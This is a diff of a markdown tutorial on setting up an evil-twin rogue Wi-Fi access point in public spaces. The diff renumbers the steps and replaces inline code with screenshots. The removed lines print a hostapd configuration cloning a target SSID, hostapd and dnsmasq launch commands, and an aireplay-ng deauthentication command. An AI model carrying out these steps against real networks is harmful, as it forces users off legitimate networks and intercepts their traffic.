@@ -60,7 +60,7 @@ This attack is particularly effective in public spaces like cafes, airports, or 
    
    This puts the Wi-Fi adapter into monitor mode, creating an interface like `wlan0`.
 
-3. **Scan for Target Networks**:
+2. **Scan for Target Networks**:
 
    <div style="text-align: center;">
      <img src="assets/images/2.png" width="450">
@@ -68,39 +68,43 @@ This attack is particularly effective in public spaces like cafes, airports, or 
    
    Identify the target network’s SSID, BSSID (MAC address), and channel.
 
-5. **Configure the Rogue AP**:
-   Create a `hostapd.conf` file:
-   ```bash
-   interface=wlan0
-   driver=nl80211
-   ssid=TargetNetworkName
-   hw_mode=g
-   channel=6
-   macaddr_acl=0
-   auth_algs=1
-   ignore_broadcast_ssid=0
-   ```
+3. **Configure the Rogue AP**:
+
+   Configure the `hostapd.conf` file:
+
+   <div style="text-align: center;">
+     <img src="assets/images/3a.png" width="450">
+   </div>
+
+   <div style="text-align: center;">
+     <img src="assets/images/3b.png" width="450">
+   </div>
+   
    Launch the rogue AP:
-   ```bash
-   sudo hostapd hostapd.conf
-   ```
 
-6. **Set Up DHCP and DNS**:
+   <div style="text-align: center;">
+     <img src="assets/images/5.png" width="450">
+   </div>
+
+4. **Set Up DHCP and DNS**:
+
    Configure `dnsmasq.conf` to assign IP addresses to connected clients:
-   ```bash
-   interface=wlan0
-   dhcp-range=192.168.1.2,192.168.1.100,12h
-   ```
-   Start `dnsmasq`:
-   ```bash
-   sudo dnsmasq -C dnsmasq.conf
-   ```
 
-7. **Optional: Deauthentication Attack**:
-   Force clients to disconnect from the legitimate AP:
-   ```bash
-   sudo aireplay-ng --deauth 10 -a <Target_BSSID> wlan0mon
-   ```
+   <div style="text-align: center;">
+     <img src="assets/images/4a.png" width="450">
+   </div>
+
+   Start `dnsmasq`:
+
+   <div style="text-align: center;">
+     <img src="assets/images/4b.png" width="450">
+   </div>
+
+5. **Optional: Deauthentication Attack**:
+
+   <div style="text-align: center;">
+     <img src="assets/images/7.png" width="450">
+   </div>
 
 8. **Capture Traffic**:
    Use `Wireshark` to monitor traffic on the `wlan0` interface, filtering for HTTP or other protocols of interest.
